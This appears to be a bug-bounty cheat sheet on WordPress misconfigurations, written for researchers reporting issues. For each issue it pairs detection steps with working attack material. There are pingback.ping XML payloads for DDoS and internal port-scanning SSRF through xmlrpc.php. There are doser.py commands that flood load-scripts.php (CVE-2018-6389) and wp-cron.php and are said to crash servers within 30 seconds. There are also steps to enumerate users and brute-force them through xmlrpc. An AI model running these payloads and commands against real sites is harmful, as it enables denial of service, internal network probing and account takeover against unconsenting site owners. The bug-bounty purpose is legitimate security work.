# Wordpress Common Misconfiguration
Here I will try my best to mention all common security misconfigurations for Wordpress I saw before or officially referenced. I will be attaching all poc and reference as well

# Index
* Wordpress Detection
* General Scan Tool
* xmlrpc.php
* CVE-2018-6389
* WP Cornjob DOS
* WP User Enumeration

# Wordpress Detection
Well, if you are reading this you already know about technology detection tool and methods.
Still adding them below
* Wappalyzer
* WhatRuns
* BuildWith

# Geneal Scan Tool
* WpScan

# xmlrpc.php 
This is one of the common issue on wordpress. To get some bucks with this misconfiguration you must have to exploit it fully, and have to show the impact properly as well.

### Detection
* visit site.com/xmlrpc.php
* Get the error message about POST request only

### Exploit
* Intercept the request and change the method GET to POST
* List all Methods
    ```
    <methodCall>
    <methodName>system.listMethods</methodName>
    <params></params>
    </methodCall>
    ```
* Check the ```pingback.ping``` mentod is there or not
* Perform DDOS
    ```
    <methodCall>
    <methodName>pingback.ping</methodName>
    <params><param>
    <value><string>http://<YOUR SERVER >:<port></string></value>
    </param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
    </value></param></params>
    </methodCall>
    ```
* Perform SSRF (Internal PORT scan only)
    ```
    <methodCall>
    <methodName>pingback.ping</methodName>
    <params><param>
    <value><string>http://<YOUR SERVER >:<port></string></value>
    </param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
    </value></param></params>
    </methodCall>
    ```
### References
[Bug Bounty Cheat Sheet](https://m0chan.github.io/2019/12/17/Bug-Bounty-Cheetsheet.html)

[Medium Writeup](https://medium.com/@the.bilal.rizwan/wordpress-xmlrpc-php-common-vulnerabilites-how-to-exploit-them-d8d3c8600b32)

[WpEngine Blog Post](https://wpengine.com/resources/xmlrpc-php/)

# CVE-2018-6389
This issue can down any Wordpress site under 4.9.3 So while reporting make sure that your target website is running wordpress under 4.9.3

### Detection
Use the URL from my gist called loadsxploit, you will get a massive js data in response.

[loadsxploit](https://gist.github.com/remonsec/4877e9ee2b045aae96be7e2653c41df9)

### Exploit
You can use any Dos tool i found Doser really fast and it shut down the webserver within 30 second

[Doser](https://github.com/quitten/doser.py)
```
python3 doser.py -t 999 -g 'https://site.com/fullUrlFromLoadsxploit'
```
### References
[H1 Report](https://hackerone.com/reports/752010)

[CVE Details](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-6389)

[Blog Post](https://baraktawily.blogspot.com/2018/02/how-to-dos-29-of-world-wide-websites.html)


# WP Cornjob DOS
This is another area where you can perform a DOS attack.

### Detection
* visit site.com/wp-cron.php
* You will see a Blank page with 200 HTTP status code

### Exploit
You can use the same tool Doser for exploiting this 
```
python3 doser.py -t 999 -g 'https://site.com/wp-cron.php'
```
### Reference

[GitHub Issue](https://github.com/wpscanteam/wpscan/issues/1299)

[Medium Writeup](https://medium.com/@thecpanelguy/the-nightmare-that-is-wpcron-php-ae31c1d3ae30)

# WP User Enumeration
This issue will only acceptable when target website is hiding their current users or they are not publically available. So attacker can use those user data for bruteforcing and other staff

### Detection
* visit site.com/wp-json/wp/v2/users/
* You will see json data with user info in response

### Exploit
If you have xmlrpc.php and this User enumeration both presence there. Then you can chain them out by collecting username from wp-json and perform Bruteforce on them via xmlrpc.php. It will surely show some extra effort and increase the impact as well

### Reference
[H1 Report](https://hackerone.com/reports/356047)

# Researcher Note
Please do not depend on those issues at all. I saw people only looking for those issues and nothing else. Those are good to have a look while testing for other vulnerabilities and most of the time they work good for chaining with other low bugs.

# Author
**Name:** Mehedi Hasan Remon

**Handle:** [@remonsec](https://twitter.com/remonsec)